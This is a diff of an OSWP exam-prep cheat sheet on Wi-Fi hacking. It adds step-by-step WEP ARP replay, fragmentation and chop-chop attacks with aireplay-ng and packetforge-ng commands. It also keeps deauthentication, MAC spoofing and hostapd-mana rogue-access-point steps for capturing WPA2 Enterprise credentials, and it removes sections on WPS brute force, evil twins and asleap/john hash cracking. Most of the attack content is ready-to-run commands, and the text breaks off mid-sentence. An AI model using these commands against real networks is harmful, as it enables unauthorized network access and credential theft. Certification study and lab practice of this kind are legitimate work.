@@ -1,6 +1,6 @@
 # Chapter 0.6 - Another Quick Cheat Sheet
 
-Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterprise attacks using manual methods** like **`hostapd-mana`** instead of automated tools.
+Here's the updated Wi-Fi Hacking Cheat Sheet with the **ARP replay attack**, **fragmentation attack**, and **chop-chop attack** for **WEP** added.
 
 ---
 
@@ -17,11 +17,11 @@ Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterpri
 - **802.11ax (Wi-Fi 6)**: 2.4/5 GHz, 10+ Gbps
 
 #### **2. Wi-Fi Encryption Types**
-- **WEP**: Vulnerable, uses RC4, 24-bit IV (easily cracked using tools like `aircrack-ng`)
-- **WPA**: TKIP (Temporal Key Integrity Protocol), RC4 (deprecated)
-- **WPA2**: CCMP/AES encryption, commonly used but vulnerable to KRACK
-- **WPA3**: Uses SAE (Simultaneous Authentication of Equals), more secure but requires advanced attacks
-- **WPA2/WPA3 Enterprise**: EAP (Extensible Authentication Protocol) with a RADIUS server for user authentication
+- **WEP**: Vulnerable, uses RC4, 24-bit IV (easily cracked using packet injection attacks).
+- **WPA**: TKIP (Temporal Key Integrity Protocol), RC4 (deprecated).
+- **WPA2**: CCMP/AES encryption, vulnerable to KRACK.
+- **WPA3**: Uses SAE (Simultaneous Authentication of Equals), more secure but still has advanced attack vectors.
+- **WPA2/WPA3 Enterprise**: EAP (Extensible Authentication Protocol) with a RADIUS server for user authentication.
 
 ---
 
@@ -35,30 +35,83 @@ Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterpri
     - Basic command: `airodump-ng wlan0mon`
     - Channel specific: `airodump-ng -c <channel> wlan0mon`
   
-- **`aireplay-ng`**: Deauthenticate or inject packets
+- **`aireplay-ng`**: Deauthenticate or inject packets, useful for WEP attacks.
     - Deauth: `aireplay-ng -0 10 -a <AP MAC> wlan0mon`
     - Fake auth: `aireplay-ng -1 0 -a <AP MAC> -h <your MAC> wlan0mon`
-  
-- **`aircrack-ng`**: Crack captured packets
+
+- **`aircrack-ng`**: Crack captured packets (WEP/WPA/WPA2).
     - Crack WEP: `aircrack-ng <capture file>.cap`
     - Crack WPA/WPA2: `aircrack-ng -w <wordlist> <capture file>.cap`
-
-- **`hostapd-mana`**: A specialized version of `hostapd` for man-in-the-middle attacks on WPA2/WPA3 Enterprise.
 
 ---
 
 #### **4. Attacking WEP**
 
-- **Capture the handshake:**
+##### **4.1. ARP Replay Attack (Speed Up IV Collection)**
+
+- **Step 1: Start capturing packets**:
     - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
   
-- **Fake Authentication:**
+- **Step 2: Fake Authentication** (if needed):
     - `aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon`
+
+- **Step 3: ARP Replay Attack** (Injecting ARP packets to increase IV collection):
+    - `aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon`
   
-- **ARP Request Replay (inject packets to speed up cracking):**
-    - `aireplay-ng -3 -b <BSSID> wlan0mon`
+    You’ll see messages indicating ARP packets are being replayed. This attack increases the number of weak IVs captured.
+
+- **Step 4: Crack WEP key**:
+    - `aircrack-ng <output file>.cap`
+
+##### **4.2. Fragmentation Attack**
+
+The fragmentation attack is useful when no clients are available, and you can break a WEP key by fragmenting a packet.
+
+- **Step 1: Start capturing packets**:
+    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
   
-- **Crack WEP Key:**
+- **Step 2: Fake Authentication** (if needed):
+    - `aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon`
+
+- **Step 3: Perform Fragmentation Attack**:
+    - `aireplay-ng -5 -b <BSSID> -h <your MAC> wlan0mon`
+  
+    The goal is to capture a packet and fragment it, producing keystream data.
+
+- **Step 4: Use Packetforge-ng to create an ARP packet**:
+    - Once you have a usable keystream, use `packetforge-ng` to create a forged ARP request:
+      ```bash
+      packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
+      ```
+
+- **Step 5: Inject the ARP packet**:
+    - `aireplay-ng -2 -r <arp_packet> wlan0mon`
+
+- **Step 6: Crack the WEP key**:
+    - `aircrack-ng <output file>.cap`
+
+##### **4.3. Chop-Chop Attack**
+
+The chop-chop attack helps you decrypt one byte of an encrypted WEP packet and obtain the keystream.
+
+- **Step 1: Start capturing packets**:
+    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
+
+- **Step 2: Perform Chop-Chop Attack**:
+    - `aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon`
+  
+    You will capture part of a packet that can be used to forge ARP packets or perform decryption.
+
+- **Step 3: Use `packetforge-ng` to create an ARP packet**:
+    - Create an ARP request using the obtained keystream:
+      ```bash
+      packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
+      ```
+
+- **Step 4: Inject the ARP packet**:
+    - `aireplay-ng -2 -r <arp_packet> wlan0mon`
+
+- **Step 5: Crack the WEP key**:
     - `aircrack-ng <output file>.cap`
 
 ---
@@ -77,39 +130,7 @@ Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterpri
 
 ---
 
-#### **6. WPS Attack (Manual Approach)**
-
-- **Find WPS-enabled APs** using `wash`:
-    - `wash -i wlan0mon`
-  
-- **Attempt to brute force the WPS PIN manually with `reaver` or manually crafted scripts**.
-
----
-
-#### **7. Hidden SSID Discovery**
-
-- **Capture Hidden SSID:**
-    - `airodump-ng -c <channel> --bssid <BSSID> -w <output file> wlan0mon`
-  
-- **Deauth Clients to reveal SSID:**
-    - `aireplay-ng -0 10 -a <BSSID> wlan0mon`
-
----
-
-#### **8. Evil Twin Attack (Manual Setup)**
-
-- **Set up Rogue AP with `hostapd`:**
-    - Create a configuration file for `hostapd` to mimic the target AP's SSID and encryption settings.
-    - Start `hostapd`:  
-      ```bash
-      hostapd /path/to/hostapd.conf
-      ```
-
-- **Capture client traffic and credentials manually using a packet capture tool** like `tcpdump` or `wireshark`.
-
----
-
-#### **9. WPA2/WPA3 Enterprise Attacks (Manual)**
+#### **6. WPA2/WPA3 Enterprise Attacks (Manual)**
 
 - **Rogue AP Attack using `hostapd-mana`** (WPA2 Enterprise):
     - **Install `hostapd-mana`:**
@@ -117,7 +138,7 @@ Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterpri
       apt-get install hostapd-mana
       ```
     - **Configure `hostapd-mana`:**
-      Edit the configuration file (`hostapd-mana.conf`) to match the SSID of the target network and set up the rogue AP to capture enterprise credentials.
+      Edit the configuration file (`hostapd-mana.conf`) to mimic the SSID of the target network and set up the rogue AP to capture enterprise credentials.
     - **Run `hostapd-mana`:**
       ```bash
       hostapd-mana /path/to/hostapd-mana.conf
@@ -138,23 +159,7 @@ Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterpri
 
 ---
 
-#### **10. Manual EAP Credential Cracking (PEAP/MSCHAPv2)**
-
-- **Crack LEAP Credentials with `asleap`:**
-    - After capturing the challenge and response from the LEAP authentication, use:
-      ```bash
-      asleap -C <challenge> -R <response> -W <wordlist>
-      ```
-
-- **Crack PEAP/MSCHAPv2 Credentials with `john`**:
-    - Once you capture the EAP-MSCHAPv2 handshake:
-      ```bash
-      john --wordlist=<wordlist> eap-hashes.txt
-      ```
-
----
-
-#### **11. Miscellaneous Commands**
+#### **7. Miscellaneous Commands**
 
 - **Change MAC Address (if needed):**
     - `ifconfig wlan0 down`
@@ -169,17 +174,15 @@ Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterpri
 
 ---
 
-#### **12. Practice**
+#### **8. Practice**
 
-- **Set up your own test environment using a router**: Configure WPA2 Enterprise with a RADIUS server to simulate realistic attacks and practice safely.
+- **Set up your own test environment using a router**: Configure WEP or WPA2 Enterprise with a RADIUS server to simulate realistic attacks and practice safely.
 
-- **Use `Wireshark` to analyze captured traffic**: Understanding the structure of EAP handshakes and PEAP/MSCHAPv2 exchanges will help during credential interception.
+- **Use `Wireshark` to analyze captured traffic**: Understand the structure of WEP and WPA/WPA2 handshakes and traffic exchanges to master credential interception.
 
 ---
 
 ### **Tips for the OSWP Exam**
-- **Understand each step of manual attacks**: From setting up a rogue AP to intercepting and cracking credentials, focus on the underlying protocols.
-- **Capture WPA2 Enterprise credentials**: Practice using `hostapd-mana` to set up rogue APs and capture PEAP/MSCHAPv2 handshakes.
-- **Crack captured hashes manually** using tools like `john` or `asleap`.
-
-Good luck with your OSWP exam preparation! Let me know if you need further clarifications or details.
+- Focus on **manual attack vectors** like ARP Replay, Fragmentation, and Chop-Chop for WEP.
+- Practice setting up and attacking WPA2 Enterprise using **`hostapd-mana`**.
+- Learn how to **crack captured hashes** from WEP and WPA handshakes using **manual tools** like
